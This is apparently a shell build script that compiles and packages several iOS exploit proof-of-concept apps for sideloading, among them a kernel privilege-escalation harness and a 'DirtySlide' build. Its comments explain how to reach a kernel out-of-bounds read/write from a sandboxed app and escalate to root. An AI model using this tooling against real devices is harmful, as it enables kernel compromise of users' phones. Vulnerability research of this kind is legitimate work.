#!/bin/sh
# build-ios.sh - build the CVE-2026-43724 first-mapper harness for iOS (arm64).
# Two binaries:
#   LPE            -> the app's main executable (host_ios.c): spawns the child SUSPENDED|RESLIDE,
#                     task_for_pid()s it, hijacks its main thread to child_probe, reports errno.
#   libchild.dylib -> the child (child.c): raw-syscall-only code that runs PRE-dyld.
# The child is named .dylib on purpose: our iloader/isideload signing pass signs every *.dylib
# in the bundle with the personal-team certificate, which is what AMFI needs to exec it.
set -e

SDK=$(xcrun --sdk iphoneos --show-sdk-path)
ARCH=arm64
DIST=dist
DIST2=dist2
DIST3=dist3
DIST4=dist4
DIST5=dist5
APP="$DIST/Payload/LPE.app"
# -Wl,-ld_classic: Xcode 16.4's new linker asserts in HeaderWriter::setCustomStackSize
# while writing the entry point for plain arm64 executables (the host link died with
# "ld: Assertion failed: (found), function setCustomStackSize, HeaderWriter.cpp:652").
# The classic linker has no such assert and natively handles -stack_addr/-stack_size.
CC="clang -arch $ARCH -isysroot $SDK -miphoneos-version-min=16.0 -O0 -g -Wall -fno-stack-protector -Wl,-ld_classic"

mkdir -p "$APP"

echo "[*] building child (standalone: it keeps its own main(), we never reach it)..."
$CC -o "$APP/libchild.dylib" child.c

# child_probe offset (relative to the child's __TEXT base) is what the host needs
PROBE_ADDR=$(nm "$APP/libchild.dylib" | awk '/ _child_probe$/ {print $1}' | sed 's/^0x//')
TEXT_VMADDR=$(otool -l "$APP/libchild.dylib" | awk '/segname __TEXT/{f=1} f&&/vmaddr/{print $2; exit}' | sed 's/^0x//')
OFF=$(printf '0x%x' $(( 0x$PROBE_ADDR - 0x$TEXT_VMADDR )))
echo "#define PROBE_OFFSET $OFF" > probe_off.h
TRIG_ADDR=$(nm "$APP/libchild.dylib" | awk '/ _child_trigger$/ {print $1}' | sed 's/^0x//')
TRIG_OFF=$(printf '0x%x' $(( 0x$TRIG_ADDR - 0x$TEXT_VMADDR )))
echo "#define TRIGGER_OFFSET $TRIG_OFF" > trig_off.h
echo "[*] child_probe @ 0x$PROBE_ADDR, __TEXT 0x$TEXT_VMADDR => PROBE_OFFSET=$OFF"
echo "[*] child_trigger @ 0x$TRIG_ADDR => TRIGGER_OFFSET=$TRIG_OFF"

echo "[*] building host (full RIE runner: probe/trigger/allinject via RIE_MODE)..."
$CC -I. -o "$APP/LPE" host_ios.c

cat > "$APP/Info.plist" <<PLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>CFBundleExecutable</key><string>LPE</string>
  <key>CFBundleIdentifier</key><string>com.lab.lpe</string>
  <key>CFBundleName</key><string>LPE</string>
  <key>CFBundleVersion</key><string>1.0</string>
  <key>CFBundleShortVersionString</key><string>1.0</string>
  <key>CFBundlePackageType</key><string>APPL</string>
  <key>LSRequiresIPhoneOS</key><true/>
  <key>MinimumOSVersion</key><string>16.0</string>
  <key>UIDeviceFamily</key><array><integer>1</integer></array>
  <key>UILaunchScreen</key><dict/>
  <key>UISupportedInterfaceOrientations</key><array><string>UIInterfaceOrientationPortrait</string></array>
</dict>
</plist>
PLIST

codesign -s - --force "$APP/libchild.dylib" 2>/dev/null || true
codesign -s - --force "$APP/LPE" 2>/dev/null || true

# ---- static, dependency-free probe (LPE2) -------------------------------------
# A binary with no dylib dependencies gives dyld nothing to map; if the shared-cache
# region therefore stays empty (sr_first_mapping == -1), the process itself becomes a
# viable #536 first-mapper and the DirtySlide chain needs no child process at all.
APP2="$DIST2/Payload/LPE2.app"
mkdir -p "$APP2"
# The static link uses -stack_addr/-stack_size: ld64 on newer Xcode asserts on them.
# Treat a failure here as non-fatal so the rest of the payloads still get built.
if $CC -O0 -g -fno-builtin -fno-asynchronous-unwind-tables -fno-unwind-tables -fno-stack-protector \
    -nostdlib -Wl,-static -Wl,-e,_start -Wl,-no_pie -Wl,-stack_addr,0x160000000 \
    -Wl,-stack_size,0x100000 -Wl,-headerpad,0x1000 -o "$APP2/LPE2" probe_static.c 2>&1; then
  echo "[+] LPE2 linked"
else
  echo "[!] LPE2 static link failed (ld64 stack_addr assertion) - continuing without it"
  rm -f "$APP2/LPE2"
fi
cat > "$APP2/Info.plist" <<PLIST2
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>CFBundleExecutable</key><string>LPE2</string>
  <key>CFBundleIdentifier</key><string>com.lab.probe</string>
  <key>CFBundleName</key><string>LPE2</string>
  <key>CFBundleVersion</key><string>1.0</string>
  <key>CFBundleShortVersionString</key><string>1.0</string>
  <key>CFBundlePackageType</key><string>APPL</string>
  <key>LSRequiresIPhoneOS</key><true/>
  <key>MinimumOSVersion</key><string>16.0</string>
  <key>UIDeviceFamily</key><array><integer>1</integer></array>
  <key>UILaunchScreen</key><dict/>
</dict>
</plist>
PLIST2
codesign -s - --force "$APP2/LPE2" 2>/dev/null || true
cd "$DIST2"
rm -f LPE2.ipa
zip -q -r -X LPE2.ipa Payload
cd ..
echo "[+] built dist2/LPE2.ipa"
# ---- VideoToolbox trigger harness (LPE3) ---------------------------------------
APP3="$DIST3/Payload/VT3.app"
mkdir -p "$APP3"
$CC -x objective-c -O0 -g -o "$APP3/VT3" vt_probe.m -framework Foundation -framework VideoToolbox -framework CoreMedia -framework CoreVideo
cat > "$APP3/Info.plist" <<PLIST3
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>CFBundleExecutable</key><string>VT3</string>
  <key>CFBundleIdentifier</key><string>com.lab.lpe</string>
  <key>CFBundleName</key><string>VT3</string>
  <key>CFBundleVersion</key><string>1.0</string>
  <key>CFBundleShortVersionString</key><string>1.0</string>
  <key>CFBundlePackageType</key><string>APPL</string>
  <key>LSRequiresIPhoneOS</key><true/>
  <key>MinimumOSVersion</key><string>16.0</string>
  <key>UIDeviceFamily</key><array><integer>1</integer></array>
  <key>UILaunchScreen</key><dict/>
  <key>UIBackgroundModes</key><array><string>audio</string></array>
</dict>
</plist>
PLIST3
codesign -s - --force "$APP3/VT3" 2>/dev/null || true
cd "$DIST3"
rm -f VT3.ipa
zip -q -r -X VT3.ipa Payload
cd ..
echo "[+] built dist3/VT3.ipa"

# ---- AppleAVE2 IOKit PoC (CVE-2026-64747 reachability + overflow attempt) ------
APP4="$DIST4/Payload/AVEPOC.app"
mkdir -p "$APP4"
$CC -O0 -g -o "$APP4/AVEPOC" poc_ave2_reach.c -framework IOKit -framework CoreFoundation
cat > "$APP4/Info.plist" <<PLIST4
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>CFBundleExecutable</key><string>AVEPOC</string>
  <key>CFBundleIdentifier</key><string>com.lab.lpe</string>
  <key>CFBundleName</key><string>AVEPOC</string>
  <key>CFBundleVersion</key><string>1.0</string>
  <key>CFBundleShortVersionString</key><string>1.0</string>
  <key>CFBundlePackageType</key><string>APPL</string>
  <key>LSRequiresIPhoneOS</key><true/>
  <key>MinimumOSVersion</key><string>16.0</string>
  <key>UIDeviceFamily</key><array><integer>1</integer></array>
  <key>UILaunchScreen</key><dict/>
</dict>
</plist>
PLIST4
codesign -s - --force "$APP4/AVEPOC" 2>/dev/null || true
cd "$DIST4"
rm -f AVEPOC.ipa
zip -q -r -X AVEPOC.ipa Payload
cd ..
echo "[+] built dist4/AVEPOC.ipa"

# ---- VideoToolbox primary test for the AppleAVE2 encoder overflow (vt_prim.c) --------
APP5="$DIST5/Payload/VT4.app"
mkdir -p "$APP5"
$CC -x objective-c -O0 -g -o "$APP5/VT4" vt_prim.c -framework Foundation -framework VideoToolbox -framework CoreMedia -framework CoreVideo
cat > "$APP5/Info.plist" <<PLIST5
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>CFBundleExecutable</key><string>VT4</string>
  <key>CFBundleIdentifier</key><string>com.lab.lpe</string>
  <key>CFBundleName</key><string>VT4</string>
  <key>CFBundleVersion</key><string>1.0</string>
  <key>CFBundleShortVersionString</key><string>1.0</string>
  <key>CFBundlePackageType</key><string>APPL</string>
  <key>LSRequiresIPhoneOS</key><true/>
  <key>MinimumOSVersion</key><string>16.0</string>
  <key>UIDeviceFamily</key><array><integer>1</integer></array>
  <key>UILaunchScreen</key><dict/>
</dict>
</plist>
PLIST5
codesign -s - --force "$APP5/VT4" 2>/dev/null || true
cd "$DIST5"
rm -f VT4.ipa
zip -q -r -X VT4.ipa Payload
cd ..
echo "[+] built dist5/VT4.ipa"
cd "$DIST"
rm -f LPE.ipa
zip -q -r -X LPE.ipa Payload
cd ..
echo "[+] built dist/LPE.ipa"
ls -la dist/LPE.ipa dist/Payload/LPE.app/
file dist/Payload/LPE.app/LPE dist/Payload/LPE.app/libchild.dylib

# ---- CVE-2026-86950 CoreGraphics PoC harness ("the great glyph grift") ----------
# Landed in dist5 alongside VT4 so the existing workflow's artifact commit
# (`git add -f dist dist2 dist3 dist4 dist5`) picks it up with NO change to
# .github/workflows (the GitHub App token cannot push workflow files).
# The trigger.pdf/trigger.ttf are the upstream califio PoC inputs.
APP9="dist5/Payload/CGPOC.app"
mkdir -p "$APP9"
$CC -x objective-c -O0 -g -o "$APP9/CGPOC" cg_poc.c \
    -framework Foundation -framework CoreGraphics -framework ImageIO
cp -f trigger.pdf "$APP9/trigger.pdf"
cp -f trigger.ttf "$APP9/trigger.ttf"
cat > "$APP9/Info.plist" <<PLIST9
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>CFBundleExecutable</key><string>CGPOC</string>
  <key>CFBundleIdentifier</key><string>com.lab.lpe</string>
  <key>CFBundleName</key><string>CGPOC</string>
  <key>CFBundleVersion</key><string>1.0</string>
  <key>CFBundleShortVersionString</key><string>1.0</string>
  <key>CFBundlePackageType</key><string>APPL</string>
  <key>LSRequiresIPhoneOS</key><true/>
  <key>MinimumOSVersion</key><string>16.0</string>
  <key>UIDeviceFamily</key><array><integer>1</integer></array>
  <key>UILaunchScreen</key><dict/>
</dict>
</plist>
PLIST9
codesign -s - --force "$APP9/CGPOC" 2>/dev/null || true
rm -f dist5/CGPOC.ipa
cd dist5
zip -q -r -X CGPOC.ipa Payload/CGPOC.app
cd ..
echo "[+] built dist5/CGPOC.ipa"

# ---- CVE-2026-64747 DECODE-side trigger (the encoder route needs a 12.9 GB
#      client-side pixel buffer; the decoder gets its size from the bitstream) --
APP10="dist5/Payload/VTDEC.app"
mkdir -p "$APP10"
# Each optional target is compiled in its own shell so ONE broken harness cannot
# take the whole build (and therefore every other artifact) down with it.
if $CC -x objective-c -O0 -g -o "$APP10/VTDEC" vtdec_poc.c \
    -framework Foundation -framework VideoToolbox -framework CoreMedia -framework CoreVideo; then
  echo "[+] VTDEC compiled"
else
  echo "[!] VTDEC failed to compile - continuing without it"
  rm -f "$APP10/VTDEC"
fi
cat > "$APP10/Info.plist" <<PLIST10
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>CFBundleExecutable</key><string>VTDEC</string>
  <key>CFBundleIdentifier</key><string>com.lab.lpe</string>
  <key>CFBundleName</key><string>VTDEC</string>
  <key>CFBundleVersion</key><string>1.0</string>
  <key>CFBundleShortVersionString</key><string>1.0</string>
  <key>CFBundlePackageType</key><string>APPL</string>
  <key>LSRequiresIPhoneOS</key><true/>
  <key>MinimumOSVersion</key><string>16.0</string>
  <key>UIDeviceFamily</key><array><integer>1</integer></array>
  <key>UILaunchScreen</key><dict/>
</dict>
</plist>
PLIST10
codesign -s - --force "$APP10/VTDEC" 2>/dev/null || true
rm -f dist5/VTDEC.ipa
cd dist5
zip -q -r -X VTDEC.ipa Payload/VTDEC.app
cd ..
echo "[+] built dist5/VTDEC.ipa"

# ---- full-resolution ImageIO decode harness (CGDEC) -----------------------------
# The CGPOC harness only asks for a THUMBNAIL, and the thumbnail path may decode at
# a reduced scale, so it would never make the codec allocate the real (wrapped)
# buffer. CGDEC asks for the FULL image, which is the path that drives the real
# frame allocation in AppleAVE2.
APP11="dist5/Payload/CGDEC.app"
mkdir -p "$APP11"
if $CC -x objective-c -O0 -g -o "$APP11/CGDEC" cg_decode.c \
    -framework Foundation -framework CoreGraphics -framework ImageIO; then
  echo "[+] CGDEC compiled"
else
  echo "[!] CGDEC failed to compile - continuing without it"
  rm -f "$APP11/CGDEC"
fi
cat > "$APP11/Info.plist" <<PLIST11
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>CFBundleExecutable</key><string>CGDEC</string>
  <key>CFBundleIdentifier</key><string>com.lab.lpe</string>
  <key>CFBundleName</key><string>CGDEC</string>
  <key>CFBundleVersion</key><string>1.0</string>
  <key>CFBundleShortVersionString</key><string>1.0</string>
  <key>CFBundlePackageType</key><string>APPL</string>
  <key>LSRequiresIPhoneOS</key><true/>
  <key>MinimumOSVersion</key><string>16.0</string>
  <key>UIDeviceFamily</key><array><integer>1</integer></array>
  <key>UILaunchScreen</key><dict/>
</dict>
</plist>
PLIST11
codesign -s - --force "$APP11/CGDEC" 2>/dev/null || true
rm -f dist5/CGDEC.ipa
cd dist5
zip -q -r -X CGDEC.ipa Payload/CGDEC.app
cd ..
echo "[+] built dist5/CGDEC.ipa"

# ---- DirtySlide (CVE-2026-43724) iOS build -------------------------------------
# Public exploit, unpatched on 26.4: an 8-byte OOB read/write into kernel memory
# adjacent to a dyld shared-cache page, from a missing in-page bounds check in the
# v5 slide walk (vm_shared_region_slide_page_v5), reachable via syscall 536 from
# an ordinary sandboxed app. No entitlement, no root, no SPTM bypass needed.
# The upstream iOS port is crash-only; the escalation (phys scan -> cred patch ->
# root) lives in the macOS sources we ship alongside it, and its defines are
# already in the iOS xcconfig.
APP12="dist11/Payload/DirtySlide.app"
mkdir -p dist11
if [ -d dirtyslide ]; then
  DD="$PWD/dd-dirtyslide"
  rm -rf "$DD"; mkdir -p "$DD"
  cp -R dirtyslide/. "$DD/"
  cd "$DD"
  # The app group entitlements need a paid team; a free personal team has no app
  # groups, so drop them. isideload re-signs everything with the real cert anyway.
  if xcodebuild -project DirtySlide.xcodeproj -scheme DirtySlide -sdk iphoneos \
       -configuration Release -derivedDataPath "$DD/dd" \
       CODE_SIGNING_ALLOWED=NO CODE_SIGNING_REQUIRED=NO CODE_SIGN_ENTITLEMENTS= \
       CODE_SIGN_IDENTITY="" PRODUCT_BUNDLE_IDENTIFIER=com.lab.lpe \
       IPHONEOS_DEPLOYMENT_TARGET=16.0 ARCHS=arm64 ONLY_ACTIVE_ARCH=NO \
       > "$DD/xcodebuild.log" 2>&1; then
    APP=$(find "$DD/dd/Build/Products" -maxdepth 3 -name "DirtySlide.app" -type d | head -1)
    if [ -n "$APP" ]; then
      mkdir -p "$(dirname "$APP12")"
      cp -R "$APP" "$APP12"
      # ad-hoc sign everything inside so the bundle is self-consistent; isideload
      # replaces the signature with the personal-team one at install time
      find "$APP12" -type f \( -name "*.dylib" -o -perm +111 \) -exec codesign -s - --force {} \; 2>/dev/null || true
      codesign -s - --force --deep "$APP12" 2>/dev/null || true
      rm -f dist11/DirtySlide.ipa
      cd dist11
      zip -q -r -X DirtySlide.ipa Payload/DirtySlide.app
      cd ..
      echo "[+] built dist11/DirtySlide.ipa"
    else
      echo "[!] xcodebuild produced no DirtySlide.app - see $DD/xcodebuild.log"
    fi
  else
    echo "[!] xcodebuild failed for DirtySlide - continuing"
    tail -20 "$DD/xcodebuild.log" 2>/dev/null || true
  fi
  cd "$OLDPWD" 2>/dev/null || true
fi

# ---- CGDECPURE (O-D startup-bug experiment) --------------------------------------
# CGDEC trapped 4/4 on 2026-10-27 at ~22 ms (PAC data-auth failure in object_getClass
# via the ObjC path-building calls, main:70) BEFORE any payload decode. This variant
# is the same harness in PURE C (no Foundation, no objc dispatch): paths from getenv,
# stat()/open()/read()/write() instead of NSFileManager, identical CF/CG decode calls.
# Read-out: survives = the ObjC-dispatch path under DVT launch is the bug (all harnesses
# go pure-C for path/report work); also traps = the launch environment itself, O-B owns.
APP13="dist5/Payload/CGDECPURE.app"
mkdir -p "$APP13"
if $CC -O0 -g -o "$APP13/CGDECPURE" cg_decode_pure.c \
    -framework CoreGraphics -framework ImageIO -framework CoreFoundation; then
  echo "[+] CGDECPURE compiled (pure C, no Foundation)"
else
  echo "[!] CGDECPURE failed to compile - continuing without it"
  rm -f "$APP13/CGDECPURE"
fi
cat > "$APP13/Info.plist" <<PLIST13
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>CFBundleExecutable</key><string>CGDECPURE</string>
  <key>CFBundleIdentifier</key><string>com.lab.lpe</string>
  <key>CFBundleName</key><string>CGDECPURE</string>
  <key>CFBundleVersion</key><string>1.0</string>
  <key>CFBundleShortVersionString</key><string>1.0</string>
  <key>CFBundlePackageType</key><string>APPL</string>
  <key>LSRequiresIPhoneOS</key><true/>
  <key>MinimumOSVersion</key><string>16.0</string>
  <key>UIDeviceFamily</key><array><integer>1</integer></array>
  <key>UILaunchScreen</key><dict/>
</dict>
</plist>
PLIST13
codesign -s - --force "$APP13/CGDECPURE" 2>/dev/null || true
rm -f dist5/CGDECPURE.ipa
cd dist5
zip -q -r -X CGDECPURE.ipa Payload/CGDECPURE.app
cd ..
echo "[+] built dist5/CGDECPURE.ipa"
